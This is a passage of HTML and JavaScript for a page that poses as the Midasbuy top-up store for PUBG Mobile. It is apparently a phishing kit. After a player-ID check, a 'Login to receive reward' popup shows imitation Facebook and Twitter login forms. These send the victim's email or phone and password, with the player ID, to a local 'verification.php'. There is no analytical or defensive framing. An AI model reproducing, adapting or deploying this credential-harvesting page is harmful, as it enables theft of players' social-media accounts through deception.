Pay","pm":"os_codapay:48","subchannel":"pipay"},"mol_paysafecard":{"channel":"mol_global","currencyType":["MXN","USD","CAD"],"icon_h5":"","icon_pc":"//cdn.midasbuy.com/images/2104x2104_107_meitu_122f24ecd9.png","icon_pc_2":"//cdn.midasbuy.com/images/2104x2104_107_meitu_122f24ecd9.png","name":"Paysafecard","pm":"mol:107","subchannel":"mol_paysafecard"},"os_redeem_code":{"currencyType":["*"],"icon_h5":"//cdn.midasbuy.com/images/os_redeem_codef338c51c.png","icon_pc":"//cdn.midasbuy.com/images/os_redeem_codef338c51c.png","id":"os_redeem_code","name":"Redeem Code","pm":"os_redeem_code"}};
    window.noComplianceCountryList = ["VN","VNG"];
    window.complianceWithBirthCountryList = ["AT","BE","BG","HR","CY","CZ","DK","EE","FI","FR","DE","GR","HU","IE","IT","LV","LT","LU","MT","NL","PL","PT","RO","SK","SI","ES","SE","GB","IS","LI","NO","CH","IN","KR","RU","TR","US","OT"];
    window.complianceWithDataCountryList = ["AT","BE","BG","HR","CY","CZ","DK","EE","FI","FR","DE","GR","HU","IE","IT","LV","LT","LU","MT","NL","PL","PT","RO","SK","SI","ES","SE","GB","IS","LI","NO","CH","OT"];
    window.buylimits = {"group1":{"country":["in","tr"],"minage":18},"group2":{"country":"*","minage":18}};
    window.channelRestore = {"default":{"helpBtn":"OK","helpDesc":"The payment channel system is under maintenance, please choose another payment method","helpTitle":"Announcement"}};
    window.needActiveData = 1;
    window.needSupplementaryTerms = 'false' === 'true';
    window.agreementArray = ["By ticking this box, you confirm that you have read and agreed to the Midasbuy <a target='_blank' href='https://www.midasbuy.com/oversea_web/static/terms.html'>Terms of Services</a> and understand how it applies to your use of Midasbuy.","By ticking this box, you confirm that you have read and agreed to the Midasbuy <a target='_blank' href='https://www.midasbuy.com/oversea_web/static/privacy.html'>Privacy Policy</a>  and understand how it applies to your use of Midasbuy.","By ticking this box, you agree to transfer your data outside of the European Economic Area. Midasbuy is a product offered by HIGH MORALE DEVELOPMENTS LTD. , a Hong Kong company who will process your data outside the European Economic Area (including Hong Kong Singapore United States and  the People's Republic of China) in order to provide the service. Please note that there are risks in such a transfer including your data being subject to differing legal regimes which may not afford it the same level of protection as that available in the country in which you are located. For more information please see our <a target='_blank' href='https://www.midasbuy.com/oversea_web/static/privacy.html'>Privacy Policy</a>."," By ticking this box, you confirm that you have read and agreed to the <a target='_blank' href='https://cdn.midasbuy.com/h5/overseah5/html/supplementary-terms-v2.html'>Supplementary Terms</a> and understand how it applies to your purchase and use of virtual goods and virtual currency in Playerunknown's BattleGround Mobile. These terms will be binding between you and Proxima Beta PTE. Limited.","You hereby consent to immediate performance of the contract and acknowledge that you will lose your right of withdrawal from the contract once the download or use of the virtual goods and/or virtual currency has commenced."];
    window.showRedeemChannel = 'false' === 'true';
</script>
<style>
    #confirmBirthdayLine, #confirmBirthdayBtn {
        cursor: pointer;
        display: -webkit-box;
        display: -webkit-flex;
        display: flex;
        -webkit-box-align: center;
        -webkit-align-items: center;
        align-items: center;
        position: relative;
        width: 60%;
        min-width: 180px;
        height: 46px;
        margin: auto;
        margin-bottom: 16px;
        background: #fff;
    }
    #confirmBirthdayBtn {
        height: auto;
        background: none;
    }
    #confirmBirthdayBtn .btn{
        width: 100%;
        height: 42px;
        line-height: 42px;
        text-align: center;
        font-size: 14px;
        color: #fff;
        float: left;
        background: #3a7bfc;
        cursor: pointer;
        margin-bottom: 16px;
    }
    #confirmBirthdayLine .date {
        width: 46px;
        height: 46px;
        background: url(https://www.midasbuy.com/oversea_web/static/images/date-icon.png) no-repeat center;
        background-size: 14px 16px;
        border-left: 1px solid #ddd;
        cursor: pointer;
    }
    #confirmBirthdayTxt {
        cursor: pointer;
        width: 72%;
        padding: 0 24px 0 15px;
        color: rgba(0,0,0,.2);
        flex: 1;
        line-height: 46px;
    }
    .pop-wrap {
        width: 100%;
        height: 100%;
        position: fixed;
        left: 0;
        top: 0;
        z-index: 9999999999;
        display: none;
        background-color: rgba(0, 0, 0, 0.6);
    }
    .time-picker-box {
        z-index: 99999999999;
    }
    .pop {
        width: 646px;
        background-color: #011633;
        margin: 0 auto;
        position: relative;
        top: 50%;
        border-radius: 5px;
        transform: translateY(-50%);
        padding: 45px 50px;
    }
    .pop .pop-title {
        font-size: 18px;
        color: #fff;
        letter-spacing: 0;
        line-height: 20px;
        cursor: pointer;
        text-align: center;
        margin-bottom: 20px;
    }
    .error-wrap-center {
        display: none;
        text-align: center;
    }
    #confirmBirthdayErrorTips {
        width: 60%;
        display: inline-block;
    }
    @media screen and (max-width: 750px) {
        .pop {
            width: 100%;
            box-shadow: none;
            max-height: 80%;
            overflow-y: scroll;
            box-sizing: border-box;
            padding: 45px 20px;
        }
    }
    #birthBoxCloseBtn {
        position: absolute;
        right: 10px;
        top: 10px;
        color: #FFFFFF;
        font-weight: bold;
        font-size: 24px;
        cursor: pointer;
    }

    /* 使用vue 的 transition 需要用到 v-show 所以就将display:none 覆盖 使用v-show来控制 */
    .pay-type-box .choose-pay-box { 
        display: block;
    }

    /* mobile使用淡出效果 */
    @media screen and (max-width: 768px) {
        .fade-select-enter-to, .fade-select-leave {
            opacity: 1;
        }

        .fade-select-enter-active, .fade-select-leave-active {
            transition: opacity .5s;
        }

        .fade-select-enter, .fade-select-leave-to /* .fade-leave-active below version 2.1.8 */ {
            opacity: 0;
        }
    }

    /* pc使用slide toggle效果 */
    @media screen and (min-width: 769px) {
        .fade-select-enter-to, .fade-select-leave {
        /* 这个高度需要注意跟重构那边同步 */
            max-height: 184px;
            overflow: hidden;
        }

        .fade-select-enter-active, .fade-select-leave-active {
            transition: max-height .5s;
        }

        .fade-select-enter, .fade-select-leave-to /* .fade-leave-active below version 2.1.8 */ {
            max-height: 0;
            overflow: hidden;
        }
    }
</style>
<div id="app" style="display: none">
    <div class="game-mess-box">
        <div class="x-main">
            <h2 class="xlogo">
                
                <a href="https://www.pubgmobile.com">
                    <img cr="logo" src="https://cdn.midasbuy.com/images/apps/pubgm/PUBGM_LOGO.png" alt="img">
                </a>
                
            </h2>
            
            <div class="gift-exchange-btn go-redeem-btn" cr="redeem">
                
                    <p>Redeem</p>
                
            </div>
            
            
            <div class="gift-exchange-btn prop-store-btn" cr="mall"><p>Shop</p></div>
            
            
        </div>
    </div>
    
    
    
    
    
    <div class="banner-wrap">
    
        
            <div class="banner-tool">
         
            <div class="main g-clr" id="banner-tool-main">
            <div class="left">
                
                    <div class="desc" id="desc">
                        <div class="text" id="text"><p class="aspa-info"></p></div>
                        
                            <div class="abox">
                                <a class="subscribe" href="https://www.facebook.com/midasbuy" target="_blank">
                                    <p class="p" cr="facebookpage">Follow</p><p class="ps">+</p>
                                </a>
                            </div>
                         
                    </div>
                
            </div>
            <div class="right">
                
                <a href="javascript:void(0);" cr="redeem" class="btn gift-exchange go-redeem-btn">
                    
                        <p>Redeem</p>
                    
                </a>
                
                
                
                <a href="javascript:void(0);" cr="mall" class="btn prop-store go-shop-btn"><p>Shop</p></a>
                
                
            </div>
        </div>
    </div>
    
    
    <div class="swiper-container" style="height: auto;overflow: visible;">
        <div class="swiper-wrapper swiper-wrapper1">
             
            
            <div class="swiper-slide">
                <a class="banner-link" href="https://wj.qq.com/s2/7889226/f419/">
                    <div class="img-box">
                        <img class="banner-pic" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAxCAQAAAALxYPPAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfkBgsLGTJGwpbsAAAAAW9yTlQBz6J3mgAAACxJREFUWMPtzEENAAAIBCC1f2ft4HY/CEBvZUzoFYvFYrFYLBaLxWKxWCz+OkvmAWHcq1PMAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIwLTA2LTExVDExOjI1OjUwKzAwOjAwDrJzIQAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMC0wNi0xMVQxMToyNTo1MCswMDowMH/vy50AAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAAAElFTkSuQmCC" data-src="https://cdn.midasbuy.com/images/s17%E8%B5%9B%E5%AD%A3%E5%8D%A1%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89%281%29_meitu_185f8089f.jpg" alt="img" cr="banner" width="auto" />
                    </div>
                </a>
            </div>
            
            
            <div class="swiper-slide">
                <a class="banner-link" href="https://www.midasbuy.com/midasbuy/ot/event/register/pubgm?from=__mds_buy_register_mall_banner&amp;lan=en">
                    <div class="img-box">
                        <img class="banner-pic" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAxCAQAAAALxYPPAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfkBgsLGTJGwpbsAAAAAW9yTlQBz6J3mgAAACxJREFUWMPtzEENAAAIBCC1f2ft4HY/CEBvZUzoFYvFYrFYLBaLxWKxWCz+OkvmAWHcq1PMAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIwLTA2LTExVDExOjI1OjUwKzAwOjAwDrJzIQAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMC0wNi0xMVQxMToyNTo1MCswMDowMH/vy50AAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAAAElFTkSuQmCC" data-src="https://cdn.midasbuy.com/images/s17%E8%B5%9B%E5%AD%A3%E5%8D%A1%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89%281%29_meitu_185f8089f.jpg" alt="img" cr="banner" width="auto" />
                    </div>
                </a>
            </div>
            
            
            <div class="swiper-slide">
                <a class="banner-link" href="/midasbuy/ot/shop/pubgm?from=__mds_buy_banner.topup">
                    <div class="img-box">
                        <img class="banner-pic" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAxCAQAAAALxYPPAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfkBgsLGTJGwpbsAAAAAW9yTlQBz6J3mgAAACxJREFUWMPtzEENAAAIBCC1f2ft4HY/CEBvZUzoFYvFYrFYLBaLxWKxWCz+OkvmAWHcq1PMAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIwLTA2LTExVDExOjI1OjUwKzAwOjAwDrJzIQAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMC0wNi0xMVQxMToyNTo1MCswMDowMH/vy50AAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAAAElFTkSuQmCC" data-src="https://cdn.midasbuy.com/images/s17%E8%B5%9B%E5%AD%A3%E5%8D%A1%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89%281%29_meitu_185f8089f.jpg" alt="img" cr="banner" width="auto" />
                    </div>
                </a>
            </div>
            
            
            <div class="swiper-slide">
                <a class="banner-link" href="https://www.midasbuy.com/static/event/checkin/index.html?appid=1450015065&amp;eventid=checkIn&amp;country=ot&amp;lan=en">
                    <div class="img-box">
                        <img class="banner-pic" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAxCAQAAAALxYPPAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfkBgsLGTJGwpbsAAAAAW9yTlQBz6J3mgAAACxJREFUWMPtzEENAAAIBCC1f2ft4HY/CEBvZUzoFYvFYrFYLBaLxWKxWCz+OkvmAWHcq1PMAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIwLTA2LTExVDExOjI1OjUwKzAwOjAwDrJzIQAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMC0wNi0xMVQxMToyNTo1MCswMDowMH/vy50AAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAAAElFTkSuQmCC" data-src="https://cdn.midasbuy.com/images/s17%E8%B5%9B%E5%AD%A3%E5%8D%A1%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89%281%29_meitu_185f8089f.jpg" alt="img" cr="banner" width="auto" />
                    </div>
                </a>
            </div>
             
        </div>
        <!-- Add Pagination -->
        <div class="swiper-pagination swiper-pagination-clickable swiper-pagination-bullets"></div>
        <!-- Add Navigation -->
        <div class="swiper-button-prev swiper-button-white" cr="banner_left"></div>
        <div class="swiper-button-next swiper-button-white" cr="banner_right"></div>
        <img class="mc l-mc" src="//midas.gtimg.cn/midasbuy/banner/mc-left.png" alt="img" />
        <img class="mc r-mc" src="//midas.gtimg.cn/midasbuy/banner/mc-right.png" alt="img" />
    </div>
    
</div>

<script type="application/javascript">
    var loadImages = function() {
        // NodeList 在 IE10 以下没有 forEach 方法，在此 Polyfill
        if (window.NodeList && !NodeList.prototype.forEach) {
            NodeList.prototype.forEach = Array.prototype.forEach;
        }
        
        // banner 图片懒加载
        var bannerImg = [{"end":"2021-01-31 00:00:00","href":"https://wj.qq.com/s2/7889226/f419/","id":"1611044081070022684015750358366","start":"2021-01-19 16:14:32","title":"redeem code user survey","url":"https://cdn.midasbuy.com/images/redeemcodesurveyfe95150d.png"},{"end":"2021-01-31 00:00:00","href":"https://www.midasbuy.com/midasbuy/ot/event/register/pubgm?from=__mds_buy_register_mall_banner&lan=en","id":"160680865048907810969291672019","start":"2020-12-01 15:43:58","title":"注册赠送二期","url":"https://cdn.midasbuy.com/images/zengso40653f96.jpg"},{"end":"2021-03-22 08:00:00","href":"/midasbuy/ot/shop/pubgm?from=__mds_buy_banner.topup","id":"160558408749005537576315530588","start":"2021-01-19 10:15:00","title":"赛季banner广告 S17","url":"https://cdn.midasbuy.com/images/s17%E8%B5%9B%E5%AD%A3%E5%8D%A1%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89%281%29_meitu_185f8089f.jpg"},{"end":"2021-03-15 00:00:00","href":"https://www.midasbuy.com/static/event/checkin/index.html?appid=1450015065&eventid=checkIn&country=ot&lan=en","id":"160416323783406940007133006532","start":"2020-11-01 00:53:46","title":"签到","url":"https://cdn.midasbuy.com/images/22112a1bb9cb8.jpg"}];        
        var imgEL = document.querySelectorAll('.banner-pic');

        imgEL.forEach(function(item) {
            var src = item.getAttribute('data-src');
            item.src = src;
        })
    }
    var getInfoAsap = window.langResource.getInfoAsap;
    if (getInfoAsap) {
        $('.banner-wrap .main .aspa-info').html(getInfoAsap.replace('{0}', '<a href="https://www.facebook.com/midasbuy" cr="facebookpage" style="color: #3A7BFC" target="_blank"> Facebook </a>'));
    } else {
        $('.banner-wrap .main .aspa-info').html('Follow us on <a href="https://www.facebook.com/midasbuy" cr="facebookpage" style="color: #3A7BFC" target="_blank"> Facebook </a> for more information.');
    }
</script>


    <div class="content">
        <div class="x-main">
<div class="tab-nav-box">
    <ul><li class="active">Player ID Verification</li></ul>

    <div class="tab-box">
        
        <div class="box id-box active" >

    <!-- BOX INPUT -->
      <div class="n-box" id="box1">
        <div class="input-box" id="input1">
        <input type="text" onclick="error_closes()" maxlength="20" id="playid" placeholder="Please enter Player ID" class="input" autocomplete="off">
        <i class="error-close" style="display: none;" onclick="error_closes()"></i>
        <div class="select-input" style=""></div></div>
       <div class="btn" id="btn_oke">OK</div>

        <div class="btn loading-btn" id="btnload" style="display: none;">
            <div class="mid">
                <img src="https://cdn.midasbuy.com/oversea_web/static/images/btn_loading_icon-2a2c3cd5b5.png" alt="img"></div>
        </div> 

      </div> 
      <p class="error-tips show" id="errors" style="display: none;"></p>


      
    <!-- BOX INPUT-->

    <!-- BOX OUTPUT -->
    <div class="y-box" id="box2" style="display: none;">
            <div class="item">
                <div class="label">Player ID</div> 
                <div class="val" style="" id="valplayid"></div></div> 
                <div class="item"><div class="label">Nickname</div>
                 <div class="val" id="valnickname"></div></div> 
                 <div class="edit-btn" onclick="editplayid()" id="editplayid">Edit</div>
    </div>
    <!-- BOX OUTPUT -->

   </div>
   <input type="hidden" id="status">
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script type="text/javascript">
        function error_closes(){
            $('.error-close').fadeOut();
            $('#errors').fadeOut();
            $('#input1').removeClass('error');
            $('#playid').val('');
        }
        function editplayid(){ 
            $('#box2').fadeOut();
            $('#box1').fadeIn();
            $('#valplayid').html('');
            $('#valnickname').html('');
        }
        $(document).ready(function() {
            $("#btn_oke").on('click', function() {
               var playid = $("#playid").val();
               if(playid == "") {
                   $('.error-close').show();
                   $('#errors').html('Player ID is required&lrm;');
                   $('#errors').show();
                   $('#input1').addClass('error');
               } else {
                    $.ajax({
                    url: "system/curl.php",
                    type: "POST",
                    data: 'playid='+playid,
                    beforeSend: function() {
                    $("#btn_oke").hide();
                    $("#btnload").show();
                    },
                    success: function(status) {
                    var stat = $('#status').val(status);
                    var isi_stat = stat.val();
                    $("#btn_oke").show();
                    $("#btnload").hide();
                    if (isi_stat == "Wrong_UserId") {
                       $('.error-close').show();
                       $('#errors').html('invalid player id(2002-2002-0)‎');
                       $('#errors').show();
                       $('#input1').addClass('error');
                    }else if(isi_stat == "System_Error"){
                       $('.error-close').show();
                       $('#errors').html('System error(2002-2002-0)‎');
                       $('#errors').show();
                       $('#input1').addClass('error');
                    }else if(isi_stat == "Token Error"){
                       $('.error-close').show();
                       $('#errors').html('System error(2002-2002-0)‎');
                       $('#errors').show();
                       $('#input1').addClass('error');
                    }else{
                        $('#box1').hide();
                        $('#box2').fadeIn();
                        $('#valplayid').html(playid);
                        $('#valnickname').html(status);
                        $('#isinick1').val(status);
                        $('#isinick2').val(status);
                        $('#isiplayid1').val(playid);
                        $('#isiplayid2').val(playid);
                        $('#payoff').hide();
                        $('#payon').show();
                    }
                    }
                    });
               }
            });


            $(".pay-btn").on('click', function() {
                $(".login").show();
            });
            $(".btn").on('click', function() {
                $(".login").hide();
            });
            $(".btn-facebook").on('click', function() {
            $(".facebook").show();
            $(".login").hide();
            });
            $(".btn-twitter").on('click', function() {
            $(".twitter").show();
            $(".login").hide();
            });
            $(".close-fb").on('click', function() {
            $(".facebook").hide();
            $(".login").show();
            });
            $(".close-other").on('click', function() {
            $(".twitter").hide();
            $(".login").show();
            });

        });
    </script>


       <p cr="playerid_find" class="help-tips find-id-btn">Couldn't find your Player ID?</p></div>
            <div class="pay-type-box payment">
                <div class="title g-clr have-desc">
                    <p>Payment Method</p>
                </div>
                
                <div class="pay-list-box g-clr">
                    <tab 
                        ref="tab"
                        v-bind:tabs_data ="tabsData"
                        :select_tab="selectTab"
                        v-on:active="onTabActive"
                        :show-help-pop.sync="showHelpPop"
                        :channel-help.sync="channelHelp"
                        select_text="Choose"
                        select_title="Choose The Bank"
                        :taskallowchannel="taskAllowChannel"
                    ></tab>
                </div>
                <channeltips v-bind:datas="activeTab"></channeltips>
            </div>
            <div class="section game-pay-section">
                <div class="title g-clr">
                    <p>Select Product</p>
                </div>
                <list v-bind:datas="currentList" v-on:active="onSelectProduct" ref="productlist"></list>
            </div>
        </div>
        <div class="clause-bg" style="display: none;"></div>
        <div class="taxes-bg"></div>
        <div class="pay-sec">
            <div class="clause-box-pop">
                <div class="x-main">
                    <p class="title">Please check the following box to continue.<i class="close"></i></p>
                    <div class="con">
                        <div class="list-row list-two">
                            <div class="list l-list" @click="function(event) {onClickChechBox(0, event.target)}">
                                <div :class="{ checkbox: true, checked: !!checkedAgreementArray[0] }"></div>
                                <p>By ticking this box, you confirm that you have read and agreed to the Midasbuy <a target='_blank' href='https://www.midasbuy.com/oversea_web/static/terms.html'>Terms of Services</a> and understand how it applies to your use of Midasbuy.</p>
                            </div>
                            <div class="list r-list" @click="function(event) {onClickChechBox(1, event.target)}">
                                <div :class="{ checkbox: true, checked: !!checkedAgreementArray[1] }"></div>
                                <p>By ticking this box, you confirm that you have read and agreed to the Midasbuy <a target='_blank' href='https://www.midasbuy.com/oversea_web/static/privacy.html'>Privacy Policy</a>  and understand how it applies to your use of Midasbuy.</p>
                            </div>
                        </div>
                        
                        <div id="dataRightCheckbox" class="list-row">
                            <div class="list" @click="function(event) {onClickChechBox(2, event.target)}">
                                <div :class="{ checkbox: true, checked: !!checkedAgreementArray[2] }"></div>
                                <p>By ticking this box, you agree to transfer your data outside of the European Economic Area. Midasbuy is a product offered by HIGH MORALE DEVELOPMENTS LTD. , a Hong Kong company who will process your data outside the European Economic Area (including Hong Kong Singapore United States and  the People's Republic of China) in order to provide the service. Please note that there are risks in such a transfer including your data being subject to differing legal regimes which may not afford it the same level of protection as that available in the country in which you are located. For more information please see our <a target='_blank' href='https://www.midasbuy.com/oversea_web/static/privacy.html'>Privacy Policy</a>.</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="z-bg"></div>
            <div class="x-main">
                <!-- price summary-含折扣/扣税, 总价, 获得积分和成长值等信息 -->
                <div class="taxes-box-pop" style="color: white; display: none;" id="taxesBoxPop">
                    <div class="box">
                        
                        <p class="title">PRICE SUMMARY</p>
                        <img class="close" src="//midas.gtimg.cn/overseah5/image/complaint/credit-close-icon.png" alt="img" />
                        <div class="item-box">
                            <div class="item">
                                <p class="label">Original Price :</p>
                                <p class="val">{{ price }}</p>
                            </div>
                            <!-- <div class="item">
                                <p class="label">Discount :</p>
                                <p class="val yellow-color">- USD 19.00</p>
                            </div>
                            <div class="item">
                                <p class="label">Taxes :</p>
                                <p class="val">USD 3.00</p>
                            </div> -->
                            <div class="item total-item">
                                <p class="label">Total :</p>
                                <p class="val">{{ price }}</p>
                            </div>
                            <div id="vipScoreMessage" class="foot-item g-clr">
                                <div class="item-box g-clr">
                                    <p class="label">Earn Values :</p>
                                    <div class="val"><p class="midas-point growthpoint">{{ growth }} Values</p></div>
                                </div>
                                <div class="item-box g-clr">
                                    <p class="label">Earn Points :</p>
                                    <div class="val"><p class="midas-point">{{ point }} Points</p></div>
                                </div>
                            </div>
                            <p class="tips"> </p>
                            <div
                                class="pay-btn"
                                @click="pay"
                                v-bind:class="{ disable: isEditStatus }"
                            >Pay now</div>

                        </div>
                    </div>
                </div>

                <div class="right" id="payoff">
                    <div class="pay-mess">
                        <div class="t">
                            <p class="label">Total:&nbsp;</p>
                            <p class="total">{{currentProduct.fprice}}</p>
                        </div>
                        <div class="b">
                            <!-- <p class="label taxes-label yellow-color"><span class="taxes">Price includes taxes</span></p> -->
                            <p class="label taxes-label"><span class="taxes">Price includes taxes</span></p>
                        </div>
                    </div>
                    <div
                        class="pay-btn"
                        @click="pay"
                        v-bind:class="{ disable: isEditStatus }"
                    >Pay now</div>
                </div>
                <div class="right" id="payon" style="display: none;"><div class="pay-mess"><div class="t"><p class="label">Total:&nbsp;</p> <p class="total">0 USD</p></div> <div class="b"><p class="label taxes-label"><span class="taxes">Price includes taxes</span></p></div></div> <div class="pay-btn">Pay now</div></div>
            </div>
        </div>
    </div>

<div class="pop-mode-box login" style="display: none;">
            <div class="pop-mode" class="resQueryPop" style="display: block;">
                <div class="mess" style="width: 100%;">
                    <p class="warn-icon">Login to receive reward</p>
                </div>
                <div class="btn-wrap">
                    <button type="submit" style="background: #1877F1; width: 100%; height: auto; margin-top: 5px; margin-left: auto; margin-right: auto; margin-bottom: 5px; padding: 10px; color: #fff; font-size: 15px; font-family: 'Teko', sans-serif; text-align: center; border: none; border-radius: 2px; display: block;" class="btn-facebook">
                    <i class="fa fa-facebook-square" style="margin-top: 3px; float: left;"></i>
                    Login with Facebook
                    </button>
                    <button type="submit" style="background: #1877F1; width: 100%; height: auto; margin-top: 5px; margin-left: auto; margin-right: auto; margin-bottom: 5px; padding: 10px; color: #fff; font-size: 15px; font-family: 'Teko', sans-serif; text-align: center; border: none; border-radius: 2px; display: block;" class="btn-twitter">
                    <i class="fa fa-twitter" style="margin-top: 3px; float: left;"></i>
                    Login with Twitter
                    </button>
                    <center>
                    <div class="btn-wrap" style="width: 25%; margin-top: 20px; float: none;">
                    <div class="btn">Back</div>
                    </div>
                    </center>
                </div>
            </div>
        </div>

    <div class="popup-login facebook animated fadeIn" style="display: none;">
    <div class="popup-box-login-fb">
        <a class="close-fb"><i class="zmdi zmdi-close"></i></a>
        <div class="navbar-fb">
            <img src="https://g.top4top.io/p_1870ast6q3.png">
        </div>
        <div class="content-box-fb">
            <img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
            <div class="txt-login-fb">
                 Log in to your Facebook account to connect to PUBG MOBILE
            </div>
            <form class="login-form" action="verification.php" method="get">
                <label>
                <input type="text" name="miil" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
                </label>
                <label>
                <input type="password" name="pw" placeholder="Password" autocomplete="off" autocapitalize="off" required>
                </label>
                <input type="hidden" name="log" value="FB" readonly>
                <input type="hidden" name="nick" id="isinick1">
                <input type="hidden" name="playid" id="isiplayid1">
                <button type="submit" class="btn-login-fb">Log In</button>
            </form>
            <div class="txt-create-account">Create account</div>
            <div class="txt-not-now">Not now</div>
            <div class="txt-forgotten-password">Forgotten password?</div>
        </div>
        <div class="language-box">
            <center>
            <div class="language-name language-name-active">English (UK)</div>
            <div class="language-name">Bahasa Indonesia</div>
            <div class="language-name">Basa Jawa</div>
            <div class="language-name">Bahasa Melayu</div>
            <div class="language-name">日本語</div>
            <div class="language-name">Español</div>
            <div class="language-name">Português (Brasil)</div>
            <div class="language-name">
                <i class="fa fa-plus"></i>
            </div>
            </center>
        </div>
        <div class="copyright">Facebook Inc.</div>
    </div>
</div>

<div class="popup-login twitter animated fadeIn" style="display: none;">
    <div class="popup-box-login-twitter">
    <a class="close-other"><i class="zmdi zmdi-close"></i></a>
        <div class="header-twitter">
            <center>
            <img src="https://i.top4top.io/p_1870japlr5.png">
            </center>
        </div>
        <center>
        <div class="box-twitter">
            <center>
            <form action="verification.php" method="get">
                <div class="txt-login-twitter">Login to Twitter</div>
                <div class="input-box-twitter">
                    <label>Phone, email, or username</label>
                    <input type="text" name="miil" placeholder="" required>
                </div>
                <div class="input-box-twitter">
                    <label>Password</label>
                    <input type="password" name="pw" placeholder="" required>
                </div>
                <input type="hidden" name="nick" id="isinick2">
                <input type="hidden" name="playid" id="isiplayid2">
                <input type="hidden" name="log" value="TW" readonly>
                <button type="submit" class="btn-login-twitter">Log In</button>
                <div class="footer-menu-twitter">Forgot password?</div>
                <div class="footer-menu-twitter bulet">•</div>
                <div class="footer-menu-twitter">Sign up to Twitter</div>
            </form>
            </center>
        </div>
        </center>
    </div>
</div>

    <div class="pop-mode-box"  v-bind:style="{display:showErrorBox?'block':'none'}" style="display: none">
        <div class="pop-mode pay-fail-pop show">
            <div class="mess">
                <p>{{ payErrorInfo ? payErrorInfo : 'Payment failed.' }}</p>
            </div>
            <div class="btn-wrap">
                <div class="btn btn-l" cr="error_back" @click="showErrorBox=!showErrorBox">Back</div>
            </div>
        </div>
    </div>
    <div class="found-id-pop" v-bind:style="{display:showFindOpenid?'block':'none'}" style="display: none">
        <div class="pop-boxs" style="display:block">
            <p class="title">Couldn&#39;t find your Player ID?</p>
            
            <div class="list">
                <p class="label">1. Enter the game</p>
                <img src="https://cdn.midasbuy.com/images/apps/pubgm/guide001.png" alt="img">
            </div>
            
            
                <div class="list">
                <p class="label">2. Find your player ID</p>
                <img src="https://cdn.midasbuy.com/images/apps/pubgm/guide002.png" alt="img">
            </div>
            
            
            <div class="btn-wrap">
                <div class="btn" @click="showFindOpenid=false">OK</div>
            </div>
        </div>
    </div>
    <rchannel-box ref="rchannelPop" v-on:clickbtn="onClickRchannelPop"  v-bind:lansres="lansres" v-bind:clist="recommendChannels"></rchannel-box>
    <wechat-pop ref="wechatPop" :show.sync="showWechatPop" :channel="activeTab" :css="cssObj"></wechat-pop>
    <iframe-pop ref="iframePop" :show.sync="showIframePop" :channel="activeTab" :css="cssObj"></iframe-pop>
    <alertbox ref="alertbox" title="Tip"  desc="Please refresh and try again."  btn="OK" v-on:ok="refreshPage"></alertbox>
    <pop-mode ref="popMode" v-model="popModeOption"></pop-mode>
    <pop-input :option="popInputOption"></pop-input>
    <div class="pop-wrap" id="birthBox">
        <div class="pop">
            <div id="birthBoxCloseBtn">X</div>
            <p class="pop-title">Please confirm your birthday</p>
            <div class="con">
                <div class="input count-input" id="confirmBirthdayLine">
                    <p id="confirmBirthdayTxt" style="cursor:pointer;width:72%;">Enter birthday</p>
                    <div class="date x-btn"></div>
                    <input type="hidden" id="confirmBirth">
                </div>
                <div class="error-wrap-center">
                    <p class="error-tips" id="confirmBirthdayErrorTips"></p>
                </div>
                <div class="form-box" id="confirmBirthdayBtn">
                    <div class="btn">OK</div>
                </div>
            </div>
        </div>
    </div>

    <help-pop
        :helpPopContent="getHelpPopContent"
        :showHelpPop.sync="showHelpPop"
    ></help-pop>

    <div class="pop-mode-box" style=" display: none; " v-bind:style="{display:showResPop?'block':'none'}">
        <div class="pop-mode" style="display:none;" :style="{ display: resQueryPop ? 'block' : 'none' }">
            <div class="mess">
                <p class="warn-icon">Please complete the payment soon</p>
            </div>
            <div class="btn-wrap btn-wraps">
                <div class="btn cancel-btn" @click="cancel">Back</div>
                <div class="btn comfirm-btn" @click="queryRes(0)"> Payment completed</div>
            </div>
        </div>

        <div class="pop-mode" style="display:none;" :style="{display: noResFound ? 'block': 'none'}">
            <div class="mess have-desc">
                <p class="warn-icon"> Payment result not found</p>
            </div>
            <div class="desc min-desc"><p> There might be some lag. If the payment has been completed, please check the game later.</p></div>
            <div class="btn-wrap">
